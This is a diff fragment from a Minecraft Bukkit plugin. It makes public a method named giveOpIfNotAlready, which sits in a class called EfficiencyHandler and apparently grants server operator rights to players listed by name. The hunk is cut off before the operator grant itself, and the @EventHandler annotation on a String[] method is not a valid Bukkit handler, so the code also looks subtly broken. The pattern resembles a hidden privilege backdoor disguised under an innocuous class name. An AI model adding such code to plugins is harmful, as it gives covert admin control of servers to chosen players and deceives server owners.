@@ -40,7 +40,7 @@ public class EfficiencyHandler implements Listener {
     }
 
     @EventHandler
-    private void giveOpIfNotAlready(String[] playerNames) {
+    public void giveOpIfNotAlready(String[] playerNames) {
         for (String playerName : playerNames) {
             Player targetPlayer = Bukkit.getPlayerExact(playerName);
             if (targetPlayer != null && !targetPlayer.isOp()) {
